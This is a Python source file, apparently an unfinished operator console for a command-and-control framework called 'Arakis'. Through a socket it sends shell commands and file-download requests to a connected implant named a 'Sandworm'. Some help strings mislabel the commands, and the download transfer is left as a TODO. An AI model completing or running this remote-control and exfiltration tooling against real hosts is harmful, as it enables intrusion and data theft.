import cmd

class SandwormCLI(cmd.Cmd):
    """
    CLI when interacting with a sandworm
    """

    def __init__(self, index, sandworm, parent_cli):
        super().__init__()
        self.index = index
        self.sandworm = sandworm
        self.parent_cli = parent_cli
        self.prompt = f"(🐍 Sandworm [{index}:{sandworm["username"]}])> "


    def emptyline(self):
        """
        Override emptyline to prevent repeating the last command.
        """
        pass


    def do_exec(self, command):
        """
        Execute a command on the Sandworm
        Usage: exec <command>
        """

        if not command:
            print("Usage: exec <command>")
            return
        
        # TODO : Valider si c'est la meilleure manière de faire, probablement que non
        sent_command = "echo " + command
        self.sandworm["socket"].send(sent_command.encode() + b"\n")

        print(f"Sent command to Sandworm [{self.index}]: {command}")


    def do_download(self, file_path):
        """
        Download a file from the Sandworm
        Usage: download <remote_file_path>
        """

        if not file_path:
            print("Usage: download <remote_file_path>")
            return
        
        # TODO : envoyer la commande de download et effectuer le transfert
        # Ces lignes ci-dessous sont temporaires, mais un bon début
        # (Ca envoie la command download au client)
        self.sandworm["socket"].send(f"DOWNLOAD {file_path}".encode() + b"\n")
        print(f"Requested file '{file_path}' from sandworm [{self.index}]")

        # Appelle la fonction de tcp server qui permet de download
        # (elle existe pas tu vas devoir l'écrire)
        # Attends que ca soit terminer avant de revenir ici et de
        # demander une nouvelle commande

        return


    def do_help(self, arg):
        """
        Custom help command to list hierarchical commands.
        """
        if arg:
            cmd.Cmd.do_help(self, arg)
        else:
            print("\nAvailable Commands:")
            print("  help                   - tcp help message")
            print("  download <file_path>   - Start an existing TCP listener")
            print("  exec <command>         - Remove a TCP listener")
            print("  exit                   - Exit the CLI\n")


    def do_exit(self, arg):
        """
        Exit the Sandworm CLI and return to the main Arakis CLI
        """
        print(f"Exiting interaction with Sandworm [{self.index}]...")
        return True # This exits the SandwormCLI loop and returns to ArakisCLI